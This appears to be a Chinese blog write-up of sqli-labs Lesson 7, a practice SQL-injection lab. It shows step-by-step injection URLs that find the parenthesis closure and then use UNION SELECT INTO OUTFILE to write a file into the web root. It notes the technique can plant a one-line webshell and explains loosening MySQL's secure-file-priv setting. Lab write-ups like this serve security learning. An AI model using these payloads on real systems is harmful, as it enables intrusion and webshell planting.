---
title: sqli-labs-lession 7 文件导入
date: 2018-09-25 21:58:44
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs-lession 7 文件导入 #
---

## 登录界面 ##

![1](/img/sql/Lesson-7/1.png)

## 注入 ##

提示使用`Use outfile`,本关使用文件导入的方式进行注入。

### 处理参数 ###

日常测试

`http://10.60.250.151/sqlilabs/Less-7/?id=1'`

![2](/img/sql/Lesson-7/2.png)

返回报错信息

猜测是单引号闭合

`http://10.60.250.151/sqlilabs/Less-7/?id=1' or 1=1%23`

![3](/img/sql/Lesson-7/3.png)

构造失败,猜测有括号闭合,尝试一下:

`http://10.60.250.151/sqlilabs/Less-7/?id=1') or 1=1%23`

还是不行,再加一个括号闭合

`http://10.60.250.151/sqlilabs/Less-7/?id=1')) or 1=1%23`

![4](/img/sql/Lesson-7/4.png)

返回成功的页面。查看源码检验。

![5](/img/sql/Lesson-7/5.png)

果然如此。

### 利用文件导入 ###

和往常一样3列

`http://10.60.250.151/sqlilabs/Less-7/?id=1')) order by 3%23`

需要设置文件路径:(`\\`避免路径出错)

`C:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\`

![6](/img/sql/Lesson-7/6.png)

`http://10.60.250.151/sqlilabs/Less-7/?id=1')) union select 1,2,3 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.txt"%23`

![10](/img/sql/Lesson-7/10.png)

虽然上面报错了,但是我的文件成功插入了。

![11](/img/sql/Lesson-7/11.png)

这个漏洞可以用来上传一句话木马。

### 可能遇到的错误 ###

#### secure-file-priv ####

如果文件导入不成功,确认Mysql配置文件`my.ini`下存在`secure-file-priv`

secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。

* secure_file_priv的值为null ，表示限制mysqld不允许导入|导出

* secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下

* secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制

使用命令`show global variables like '%secure%';`查看`secure-file-priv`参数的值：

![7](/img/sql/Lesson-7/7.png)

在phpMyadmin中查询命令也可以发现`secure-file-priv`拒绝执行语句

![8](/img/sql/Lesson-7/8.png)

修改`my.ini`添加`secure-file-priv`参数,没有填具体值表示不做限制(这样做其实很危险)

![9](/img/sql/Lesson-7/9.png)

<font color=red>保存好后重启MYSQL</font>

